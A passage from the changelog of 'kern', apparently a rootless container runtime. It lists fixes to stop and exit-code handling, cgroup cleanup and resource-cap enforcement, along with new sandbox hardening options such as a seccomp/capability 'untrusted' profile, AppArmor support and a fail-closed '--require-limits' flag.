  box asked for 3 s got 2. Measured: a workload that flushes for 2.5 s under `--stop-timeout 3` was
  SIGKILLed at 2019 ms and recorded 137, where Docker's `stop -t 3` let the same workload finish in
  2799 ms and exit 5. kern now finishes it in 2526 ms with exit 5. A workload that exits at once
  still returns in ~16 ms, and one whose handler never finishes now consumes the whole 3 s rather
  than two thirds of it.
- **`kern stop` records the workload's own exit code, not a blanket 137.** A service that traps the
  stop signal and shuts down cleanly was reported as `exited (137)` - killed - by `kern ps -a` and
  `kern wait`, because the 137 was written when a stop was always a SIGKILL and the graceful phase
  arrived later without it following. Now the init's real status is read from its unreaped zombie and
  recorded, and 137 is kept for the case where it is the truth: an init that ignores the signal and is
  SIGKILLed. Measured against Docker on the same four-service stack (nginx, redis, and two shells that
  trap and exit 0 and 3): both runtimes now report 0, 0, 0 and 3, where kern previously reported 137
  four times. Reading that status is a race against whoever reaps the init - correct in 15 runs out of
  20 on its own - so `stop` holds the box's own reaper with SIGSTOP for the microseconds it takes,
  which makes it 30 out of 30. The hold is taken before any signal goes out (the group signal would
  otherwise kill the reaper first), released by a `Drop` on every path, and only ever applied to a
  process the box owns - never the user's systemd manager, which inherits an orphaned init, and never
  a FOREGROUND box's own process, which would print `Stopped` in the user's terminal. It is also
  taken only for a box with a dedicated cgroup, the case where a `stop` killed mid-hold is
  recoverable: `kern ps` then shows the box ORPHANED and the next `kern stop` reaps its cgroup whole.
  A box without one keeps the unguarded read rather than risking a stopped runner nothing can clear.
  On such a host the recorded code is therefore BEST-EFFORT: measured at 1 run in 12 recording 137 for
  a workload that exited 7, against 12 in 12 where a cgroup exists. It is not a timing window a caller
  can wait out - the same 12 runs had the workload's handler installed for 800 ms before the stop. Cost measured:
  none. A single stop is 16.20 ms against a 16.23 ms baseline and `stop --all` of 50 boxes is 110 ms
  against 119 ms, because consolidating the `/proc` readers onto one `stat_field` (reading `stat`
  rather than the much more expensive `status`) paid for the two extra signals.
- `kern gc` reaps orphaned box cgroups wherever a box was created, not only under kern.slice. A box
  that the OOM killer or a SIGKILL takes down leaves its `kern-box-*` cgroup dir behind (the RAII Drop
  that removes it cannot run on SIGKILL), and gc looked in one place while `apply_limits` creates in
  two: kern.slice on the direct path, the CALLER'S own cgroup on every other path. Measured on WSL2 as
  uid 0, where no kern.slice exists and boxes land at the cgroup root: three OOM-killed boxes left
  three dirs, a later box start did not reap them, and gc reported "nothing to prune" with them in
  place. After the fix the same sequence reports "reaped 3 orphaned box cgroups" and leaves none, while
  a live box's cgroup is untouched.
- kern no longer calls a box uncapped when the kernel is capping it. The uncapped notice and the
  `--require-limits` refusal keyed off "kern wrote no cap of its own", which is not the same question:
  on the systemd-scope path the scope carries `MemoryMax`/`TasksMax` and the backstops bind without
  kern writing a byte. Measured on a Raspberry Pi 5 over ssh, the box ran with `memory.max` 67108864,
  `memory.oom.group` 1 and `pids.max` 512 and was OOM-killed as a whole three times out of three
  (`dmesg`: `Memory cgroup out of memory`, three processes at once), while kern printed the notice and
  `--require-limits` refused to start. Both now ask the kernel what is in force: a memory ceiling that
  bounds the request anywhere up the tree, and a task ceiling at the box's own level (an ancestor's
  `pids.max` is shared with the session, so it does not count). The direct-path refusal is deliberately
  unchanged, since there the box's own cgroup is the sole enforcer by design. Verified both ways: on
  the Pi the notice is gone, `--require-limits` starts, and a 300 MB write is still killed 137; on a
  host with no delegation the notice and the refusal both still fire.
- A detached box's captured log is size-capped (two-file 32 MiB ring, zero-copy `splice`), so a
  runaway writer can't fill the session tmpfs.
- An OOM kills the whole box (`memory.oom.group = 1`), not one process.
- `kern ps`/`gc` under fd exhaustion no longer prunes or mis-reaps a live box (three-state liveness).
- A SIGKILL'd/OOM'd detached supervisor no longer leaves an unreachable "ghost": liveness reads
  `cgroup.events` `populated`; an orphan is visible (`--filter status=orphaned`) and reaped
  identity-safe against pid reuse.
- systemd detection probes the user manager's own control socket (`$XDG_RUNTIME_DIR/systemd/private`,
  what `systemd-run --user` actually connects to), so kern attempts the scope only where the manager is
  provably up: a dir-only host, or one with a reachable D-Bus bus but no user manager, no longer fails
  every box (it would connect and then die past kern's irreversible re-exec).
- A non-UTF-8 argument fails validation instead of panicking.
- The instance record is written atomically (temp + `rename`).
- `kern doctor` write-probes the real cap target; an unenforceable cap warns instead of running
  silently uncapped; `--pids-limit 1` is refused at parse; a second `vcpu:` profile warns.
- `volume ls --json` no longer lists names not on disk or misdirects a delete (display vs exact
  syscall form, `usable` flag); `kern <verb> --help` filters to the verb on a real terminal.
- `kern compose` anchors a service's relative `env_file`/`-v`/`rootfs` paths to the compose file's
  own directory, not the caller's working directory, so a stack runs the same from anywhere.
- Compose `restart: always`/`unless-stopped` is honoured on a pod member instead of being degraded to
  on-failure: kern's per-service supervisor keeps it up on ANY exit (including a clean 0) for the
  stack's lifetime. A standalone box's `always`/`unless-stopped` still takes the systemd path.
- A privileged port (`-p` below 1024) reports the real cause - a missing `CAP_NET_BIND_SERVICE`, or
  the address already in use - instead of a generic bind failure.
- A `--user`/image `USER` that cannot be mapped names the actual fix (install `newuidmap`/`newgidmap`
  + a `/etc/subuid`/`/etc/subgid` allocation, or use `--uid-range`) instead of blaming `--user`.
- A kern-TOML key (`health_cmd:`, `health_interval:`, `depends_healthy:`, `depends_completed:`, ...)
  written into a `docker-compose.yml` names the docker-compose equivalent (a `healthcheck:` block, or
  `depends_on: {SERVICE: {condition: service_healthy}}`) instead of a dead-end "unsupported", so a
  file that mixed the two spellings gets the fix rather than a silently missing health gate.
- The `kern-sandbox` SDKs decide `startup_failed` from an unforgeable channel: kern writes a "box
  started" byte to a caller-supplied `KERN_STARTED_FD` (CLOEXEC, so it never reaches the workload)
  only on the started path, so a workload can no longer forge the startup-failure marker on its own
  stderr to make the SDK raise. An older kern without the signal falls back to the stderr heuristic,
  which only ever over-reports a failure, never masks a real one.

### Added

- A CI gate fails, naming the syscall, when a new kernel `__NR_*` is neither allowed, denied, nor on
  the reviewed list (x86_64 + aarch64).
- `--require-limits` (or `KERN_REQUIRE_LIMITS`): refuse to start with a non-zero exit unless the
  memory and pids caps (including their defaults) are actually enforced, read back from the cgroup
  (the OOM / fork-bomb backstop), instead of running best-effort UNCAPPED. cpu/cpuset stay
  best-effort, as on the systemd-scope path (a QoS knob with no OOM/fork-bomb role). `--allow-uncapped`
  (`KERN_ALLOW_UNCAPPED`) is the explicit inverse: accept uncapped silently on a host with no cgroup
  delegation (nested CI). The two are mutually exclusive; the default is unchanged (warn once per
  host, run uncapped).
- `kern doctor` is more actionable: the multi-uid check names the commands to run (install the
  `newuidmap`/`newgidmap` helpers, then the `/etc/subuid`/`/etc/subgid` allocation line for your user,
  numeric-uid fallback when `$USER` is unset), not hardcoded to `apt`, and a new check reports whether
  `pasta` is present for pod/box outbound networking. kern uses these when present and never writes
  `/etc/subuid` or ships `pasta` itself.
- `--security-profile <untrusted>`: an opt-in bundle (seccomp allowlist + `--cap-drop ALL` +
  `--read-only`) for running code nobody has read, applied as a base that explicit flags and env
  override (`--cap-add X`, `KERN_SECCOMP=...`). `--cap-add ALL` and `--privileged` are refused under it
  (both would negate a constituent - all capabilities back, or a relaxed seccomp filter - leaving a box
  labelled untrusted that is not); a SET-but-unrecognised `KERN_SECCOMP` is a usage error, never a
  silent downgrade to the default filter. Closed set; prints its resolved constituents so the macro
  is visible. It does NOT touch Landlock (a write-allowlist needs
  the workload's real paths; build it from an audit run) and does NOT set `--require-limits` (which
  would break a cgroup-less host). The default is unchanged. It is a CLI/SDK flag; a compose service
  sets the same posture through its individual keys and `KERN_SECCOMP`, not a `[box.NAME]` macro key.
- The `kern-sandbox` SDKs (Python and Node) reach CLI parity for the above: `security_profile`
  /`securityProfile` maps to `--security-profile`, and `require_limits`/`requireLimits` to
  `--require-limits`. `security_profile="untrusted"` composes with the writable `-v` workspace (the
  root goes read-only, a bound mount stays writable). Note `require_limits` is the fail-closed gate,
  distinct from the pre-existing `enforce_limits` (which only picks the scope vs best-effort cap path)
  and mutually exclusive with the `KERN_ALLOW_UNCAPPED` env the SDK forwards.
- `kern ps -a`/`--all` lists recently-exited boxes (from their `waitexit` breadcrumbs), and
  `kern wait` resolves a box that has already exited, not only a live one.
- `--user` (and compose `user:`) accepts a NAME, resolved against the image's own
  `/etc/passwd`/`/etc/group`; the image's declared `USER` is honoured the same way. It fails closed
  on a host without `newuidmap` rather than silently running as in-box root.
- A compose `shm_size:` is recognised and left intentionally cgroup-bounded: `/dev/shm` is charged to
  the box memory cgroup (`mem_limit` / `--memory`), not pinned to a fixed size, so there is no 64 MB
  `/dev/shm` footgun to size around.
- `--apparmor <profile>` (CLI + the `kern-sandbox` Python/Node SDKs): enter a pre-loaded AppArmor
  (LSM) profile on the box's exec, layered over namespaces + seccomp (Docker's `--security-opt
  apparmor=`). A missing or unloadable profile fails the box CLOSED; `kern exec` re-enters the box's
  recorded profile so an exec is no less confined than the workload; a box whose posture predates this
  recording is refused rather than exec'd unconfined. kern applies no default profile.
- The Linux release build produces a size-optimized binary with a pinned-nightly `build-std` +
  `-Cpanic=immediate-abort` (~22% smaller than a plain stable `--release`, which a from-source
  `cargo install` still yields), reproducible byte-for-byte with the pinned toolchain. The source
  stays 100% stable Rust, so `cargo test` runs on the same source a release would ship. The exact
  sizes and the panic-diagnostics tradeoff this buys are in [OPEN_ITEMS.md](OPEN_ITEMS.md).
